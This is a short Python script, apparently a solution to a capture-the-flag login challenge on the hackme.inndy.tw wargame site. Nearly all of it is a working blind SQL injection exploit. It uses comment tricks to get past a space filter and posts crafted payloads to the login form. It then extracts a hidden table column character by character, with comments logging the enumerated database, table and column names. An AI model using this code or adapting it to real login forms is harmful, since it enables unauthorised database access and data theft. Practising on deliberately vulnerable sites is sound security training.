import requests, string
#database()     login_as_admin1
#select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="login_as_admin1" limit 0,1    
#0bdb54c98123f5526ccaed982d2006a9 users
#select column_name from information_schema.columns where table_name="users" limit 0,1
#id name password isadmin
#select column_name from information_schema.columns where table_name="0bdb54c98123f5526ccaed982d2006a9" limit 0,1
#id 4a391a11cfa831ca740cf8d00782f3a6
#select 4a391a11cfa831ca740cf8d00782f3a6 from login_as_admin1.0bdb54c98123f5526ccaed982d2006a9 limit 0,1


sql='select 4a391a11cfa831ca740cf8d00782f3a6 from login_as_admin1.0bdb54c98123f5526ccaed982d2006a9 limit 0,1'
sql=sql.replace(" ","/*...*/")

url = 'https://hackme.inndy.tw/login1/'
length = 0
chars = string.printable
print(chars)
database = ''
result = ''
for i in range(0,100):
    print(i)
    payload = "\\\'/*...*/or/*...*/length(({sql}))={i}#".format(sql=sql,i=i)
    print(payload)
    data = {
        'name': payload,
        'password': "exploit"
    }
    r = requests.post(url, data=data)
    if "You are not admin!" in r.text:
        length = i
        print("result length is %s"%i)
        break

for i in range(len(result)+1, length+1):
    for j in chars:
        payload = "\\\'/*...*/or/*...*/ascii(substring(({sql}),{i},1))={c}#".format(sql=sql,i=i,c=ord(j))
        print(payload)
        data = {
            'name': payload,
            'password': "exploit"
        }
        r = requests.post(url, data=data)
        if "You are not admin!" in r.text:
            result += j
            print("result is %s" % result)
            break
